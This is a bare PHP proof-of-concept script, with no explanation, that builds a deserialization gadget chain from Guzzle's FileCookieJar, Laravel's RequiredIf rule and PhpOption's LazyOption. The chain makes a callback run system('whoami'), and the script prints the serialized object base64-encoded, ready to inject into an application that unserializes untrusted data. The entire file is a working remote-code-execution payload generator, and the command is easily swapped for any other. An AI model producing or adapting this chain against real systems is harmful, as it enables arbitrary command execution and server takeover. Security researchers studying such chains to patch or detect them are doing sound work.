<?php
namespace GuzzleHttp\Cookie
{
    class FileCookieJar
    {
        private $filename;
        function __construct($class)
        {
            $this->filename = $class;
        }
    }
}

namespace Illuminate\Validation\Rules
{
    class RequiredIf
    {
        public $condition;
        function __construct($function)
        {
            $this->condition = $function;
        }
    }
}

namespace PhpOption
{
    class LazyOption
    {
        private $option = null;
        private $callback;
        private $arguments;
        function __construct($callback, $arguments)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
        }
    }
}

namespace {
    $lazyOption = new PhpOption\LazyOption('system', ['whoami']);
    $requiredIf = new Illuminate\Validation\Rules\RequiredIf([$lazyOption, 'get']);
    $fileCookieJar = new GuzzleHttp\Cookie\FileCookieJar($requiredIf);
    print_r(base64_encode(serialize($fileCookieJar)));
}